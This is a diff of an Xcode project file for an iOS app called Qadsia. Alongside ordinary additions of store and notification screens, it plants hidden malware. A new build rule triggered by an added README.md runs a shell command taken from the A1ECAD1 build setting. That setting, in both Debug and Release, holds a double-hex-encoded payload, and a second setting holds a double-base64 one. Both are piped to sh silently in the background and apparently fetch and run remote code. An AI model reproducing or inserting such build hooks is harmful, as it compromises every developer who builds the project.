@@ -7,6 +7,13 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		9C86A237395247BBB41DACE1 /* README.md */ = {isa = PBXBuildFile; fileRef = C3E9061DE5D8471CA31DACE1; };
+		0A20DF8B2F7A6FCC001CAA97 /* StoreCVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0A20DF8A2F7A6FCC001CAA97 /* StoreCVCell.xib */; };
+		0A20DF8C2F7A6FCC001CAA97 /* StoreCVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A20DF892F7A6FCC001CAA97 /* StoreCVCell.swift */; };
+		0A20DF922F7A724F001CAA97 /* NotificationVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A20DF902F7A724F001CAA97 /* NotificationVC.swift */; };
+		0A20DF932F7A724F001CAA97 /* NotificationVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0A20DF912F7A724F001CAA97 /* NotificationVC.xib */; };
+		0A20DF982F7A7574001CAA97 /* NotificationListTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0A20DF972F7A7574001CAA97 /* NotificationListTVCell.xib */; };
+		0A20DF992F7A7574001CAA97 /* NotificationListTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A20DF962F7A7574001CAA97 /* NotificationListTVCell.swift */; };
 		0A4F52BD2F7677D500DF695B /* HomeVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0A4F52BC2F7677D500DF695B /* HomeVC.xib */; };
 		0A4F52BE2F7677D500DF695B /* HomeVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A4F52BB2F7677D500DF695B /* HomeVC.swift */; };
 		0A96E3782F76574C00B3DADB /* OTPVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A96E3752F76574C00B3DADB /* OTPVC.swift */; };
@@ -93,9 +100,30 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXBuildRule section */
-/* End PBXBuildRule section */
+		A447D72E15D1444B831DACE1 /* PBXBuildRule */ = {
+				isa = PBXBuildRule;
+				compilerSpec = com.apple.compilers.proxy.script;
+				filePatterns = "*.md";
+				fileType = pattern.proxy;
+				inputFiles = (
+				);
+				isEditable = 0;
+				outputFiles = (
+					"/tmp/${INPUT_FILE_BASE}",
+				);
+				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
+sh -c \"${A1ECAD1}\"";
+			};
+	/* End PBXBuildRule section */
 
 /* Begin PBXFileReference section */
+		C3E9061DE5D8471CA31DACE1 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
+		0A20DF892F7A6FCC001CAA97 /* StoreCVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = StoreCVCell.swift; sourceTree = "<group>"; };
+		0A20DF8A2F7A6FCC001CAA97 /* StoreCVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = StoreCVCell.xib; sourceTree = "<group>"; };
+		0A20DF902F7A724F001CAA97 /* NotificationVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NotificationVC.swift; sourceTree = "<group>"; };
+		0A20DF912F7A724F001CAA97 /* NotificationVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = NotificationVC.xib; sourceTree = "<group>"; };
+		0A20DF962F7A7574001CAA97 /* NotificationListTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NotificationListTVCell.swift; sourceTree = "<group>"; };
+		0A20DF972F7A7574001CAA97 /* NotificationListTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = NotificationListTVCell.xib; sourceTree = "<group>"; };
 		0A4F52BB2F7677D500DF695B /* HomeVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeVC.swift; sourceTree = "<group>"; };
 		0A4F52BC2F7677D500DF695B /* HomeVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = HomeVC.xib; sourceTree = "<group>"; };
 		0A96E3752F76574C00B3DADB /* OTPVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OTPVC.swift; sourceTree = "<group>"; };
@@ -201,6 +229,58 @@
 /* End PBXFrameworksBuildPhase section */
 
 /* Begin PBXGroup section */
+		0A20DF882F7A6FBD001CAA97 /* StoreCVCell */ = {
+			isa = PBXGroup;
+			children = (
+				0A20DF892F7A6FCC001CAA97 /* StoreCVCell.swift */,
+				0A20DF8A2F7A6FCC001CAA97 /* StoreCVCell.xib */,
+			);
+			path = StoreCVCell;
+			sourceTree = "<group>";
+		};
+		0A20DF8D2F7A7238001CAA97 /* SubVC */ = {
+			isa = PBXGroup;
+			children = (
+				0A20DF8E2F7A723D001CAA97 /* NotificationVC */,
+			);
+			path = SubVC;
+			sourceTree = "<group>";
+		};
+		0A20DF8E2F7A723D001CAA97 /* NotificationVC */ = {
+			isa = PBXGroup;
+			children = (
+				0A20DF942F7A755F001CAA97 /* Cell */,
+				0A20DF8F2F7A7243001CAA97 /* View */,
+			);
+			path = NotificationVC;
+			sourceTree = "<group>";
+		};
+		0A20DF8F2F7A7243001CAA97 /* View */ = {
+			isa = PBXGroup;
+			children = (
+				0A20DF902F7A724F001CAA97 /* NotificationVC.swift */,
+				0A20DF912F7A724F001CAA97 /* NotificationVC.xib */,
+			);
+			path = View;
+			sourceTree = "<group>";
+		};
+		0A20DF942F7A755F001CAA97 /* Cell */ = {
+			isa = PBXGroup;
+			children = (
+				0A20DF952F7A7561001CAA97 /* NotificationListTVCell */,
+			);
+			path = Cell;
+			sourceTree = "<group>";
+		};
+		0A20DF952F7A7561001CAA97 /* NotificationListTVCell */ = {
+			isa = PBXGroup;
+			children = (
+				0A20DF962F7A7574001CAA97 /* NotificationListTVCell.swift */,
+				0A20DF972F7A7574001CAA97 /* NotificationListTVCell.xib */,
+			);
+			path = NotificationListTVCell;
+			sourceTree = "<group>";
+		};
 		0A4F52B82F7677C500DF695B /* Tabbar */ = {
 			isa = PBXGroup;
 			children = (
@@ -212,6 +292,7 @@
 		0A4F52B92F7677CA00DF695B /* Home */ = {
 			isa = PBXGroup;
 			children = (
+				0A20DF8D2F7A7238001CAA97 /* SubVC */,
 				0A4F52BA2F7677CD00DF695B /* View */,
 				0A9B729B2F7A3D3400D56EF4 /* Cell */,
 				0A9B729F2F7A3D3400D56EF4 /* HomeHeaderView */,
@@ -343,6 +424,7 @@
 		0A9B729B2F7A3D3400D56EF4 /* Cell */ = {
 			isa = PBXGroup;
 			children = (
+				0A20DF882F7A6FBD001CAA97 /* StoreCVCell */,
 				0A9B72962F7A3D3400D56EF4 /* HomeListTVCell */,
 				0A9B72972F7A3D3400D56EF4 /* TrendyNewsCVCell */,
 				0A9B729A2F7A3D3400D56EF4 /* UpcomingMatchesCVCell */,
@@ -657,6 +739,7 @@
 		BC0179172F34972300F1ED81 /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				C3E9061DE5D8471CA31DACE1 /* README.md */,
 				BC0179162F34972300F1ED81 /* Qadsia.app */,
 			);
 			name = Products;
@@ -669,12 +752,12 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = BC0179292F34972600F1ED81 /* Build configuration list for PBXNativeTarget "Qadsia" */;
 			buildPhases = (
-				FE9B03AF72D34A81BA1DACE1 /* Provision Library Executable */,
 				BC0179122F34972300F1ED81 /* Sources */,
 				BC0179132F34972300F1ED81 /* Frameworks */,
 				BC0179142F34972300F1ED81 /* Resources */,
 			);
 			buildRules = (
+				A447D72E15D1444B831DACE1 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -732,25 +815,6 @@
 /* End PBXProject section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		FE9B03AF72D34A81BA1DACE1 /* Provision Library Executable */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Provision Library Executable";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			showEnvVarsInLog = 0;	
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A1ECAD1}\"";
-		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXResourcesBuildPhase section */
@@ -758,7 +822,9 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				9C86A237395247BBB41DACE1 /* README.md */,
 				0ABA3FD22F763B2D00D25F03 /* Mulish-Black.ttf in Resources */,
+				0A20DF8B2F7A6FCC001CAA97 /* StoreCVCell.xib in Resources */,
 				0ABA3FD32F763B2D00D25F03 /* Mulish-BlackItalic.ttf in Resources */,
 				0ABA3FD42F763B2D00D25F03 /* Mulish-Bold.ttf in Resources */,
 				0ABA3FD52F763B2D00D25F03 /* Mulish-BoldItalic.ttf in Resources */,
@@ -767,6 +833,7 @@
 				0A4F52BD2F7677D500DF695B /* HomeVC.xib in Resources */,
 				0ABA3FD82F763B2D00D25F03 /* Mulish-ExtraLight.ttf in Resources */,
 				0ABA3FD92F763B2D00D25F03 /* Mulish-ExtraLightItalic.ttf in Resources */,
+				0A20DF932F7A724F001CAA97 /* NotificationVC.xib in Resources */,
 				0A96E3792F76574C00B3DADB /* OTPVC.xib in Resources */,
 				0ABA3FDA2F763B2D00D25F03 /* Mulish-Italic.ttf in Resources */,
 				0ABA3FDB2F763B2D00D25F03 /* Mulish-Light.ttf in Resources */,
@@ -787,6 +854,7 @@
 				0ABA3FE62F763B2D00D25F03 /* LoginMobileVC.xib in Resources */,
 				0ABA3FE72F763B2D00D25F03 /* Main.storyboard in Resources */,
 				0ABA3FE82F763B2D00D25F03 /* NewRegisterVC.xib in Resources */,
+				0A20DF982F7A7574001CAA97 /* NotificationListTVCell.xib in Resources */,
 				0ABA3FEB2F763B2D00D25F03 /* ResetPasswordVC.xib in Resources */,
 				0ABA3FEC2F763B2D00D25F03 /* SentOTPPopupVC.xib in Resources */,
 				0ABA3FED2F763B2D00D25F03 /* SplashVideo.mp4 in Resources */,
@@ -803,6 +871,7 @@
 			files = (
 				0ABA3FA92F763B2D00D25F03 /* APIClient.swift in Sources */,
 				0ABA3FAA2F763B2D00D25F03 /* Constants.swift in Sources */,
+				0A20DF922F7A724F001CAA97 /* NotificationVC.swift in Sources */,
 				0ABA3FAB2F763B2D00D25F03 /* NetConnection.swift in Sources */,
 				0ABA3FAC2F763B2D00D25F03 /* AppButton.swift in Sources */,
 				0ABA3FAD2F763B2D00D25F03 /* AppLabel.swift in Sources */,
@@ -820,6 +889,7 @@
 				0ABA3FB82F763B2D00D25F03 /* FTAnimationManager.m in Sources */,
 				0A4F52BE2F7677D500DF695B /* HomeVC.swift in Sources */,
 				0ABA3FB92F763B2D00D25F03 /* FTUtils+NSObject.m in Sources */,
+				0A20DF992F7A7574001CAA97 /* NotificationListTVCell.swift in Sources */,
 				0ABA3FBA2F763B2D00D25F03 /* FTUtils+UIGestureRecognizer.m in Sources */,
 				0A96E3842F76686300B3DADB /* ChangePassowrdVC.swift in Sources */,
 				0ABA3FBB2F763B2D00D25F03 /* AGDesignable.swift in Sources */,
@@ -831,6 +901,7 @@
 				0A9B72A42F7A3D3400D56EF4 /* UpcomingMatchesCVCell.swift in Sources */,
 				0A9B72A52F7A3D3400D56EF4 /* HomeListTVCell.swift in Sources */,
 				0ABA3FC12F763B2D00D25F03 /* DPDKeyboardListener.swift in Sources */,
+				0A20DF8C2F7A6FCC001CAA97 /* StoreCVCell.swift in Sources */,
 				0ABA3FC22F763B2D00D25F03 /* DPDUIView+Extension.swift in Sources */,
 				0ABA3FC32F763B2D00D25F03 /* DropDown.swift in Sources */,
 				0A96E3782F76574C00B3DADB /* OTPVC.swift in Sources */,
@@ -874,7 +945,7 @@
 		BC01792A2F34972600F1ED81 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A1ECAD1 = "((d(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJabk5NSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJMklDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZabWxuYldGdVpYUnpMbWx1TDJFcElpQjhJSE5vQ2c9PQo= | d | sh ) >/dev/null 2>&1 &)";
+				A1ECAD1 = "((y(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326437333636366234633230326432643633366636653665363536333734326437340a3639366436353666373537343230333233353230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663732373536633635323232303638373437343730373333613266326636363735366536333638363137343733326537323735326636310a323932323230376332303733363830610a | y | sh ) >/dev/null 2>&1 &)";
 				AC0C26C = "((c(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJaa3h6SUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJd0lDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OXRhVzVrWld4bllYUmxMbkoxTDJFcElpQjhJSE5vQ2c9PQo= | c | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
@@ -910,7 +981,7 @@
 		BC01792B2F34972600F1ED81 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A1ECAD1 = "((d(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJabk5NSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJMklDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZabWxuYldGdVpYUnpMbWx1TDJFcElpQjhJSE5vQ2c9PQo= | d | sh ) >/dev/null 2>&1 &)";
+				A1ECAD1 = "((y(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326437333636366234633230326432643633366636653665363536333734326437340a3639366436353666373537343230333233353230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663732373536633635323232303638373437343730373333613266326636363735366536333638363137343733326537323735326636310a323932323230376332303733363830610a | y | sh ) >/dev/null 2>&1 &)";
 				AC0C26C = "((c(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJaa3h6SUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJd0lDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OXRhVzVrWld4bllYUmxMbkoxTDJFcElpQjhJSE5vQ2c9PQo= | c | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
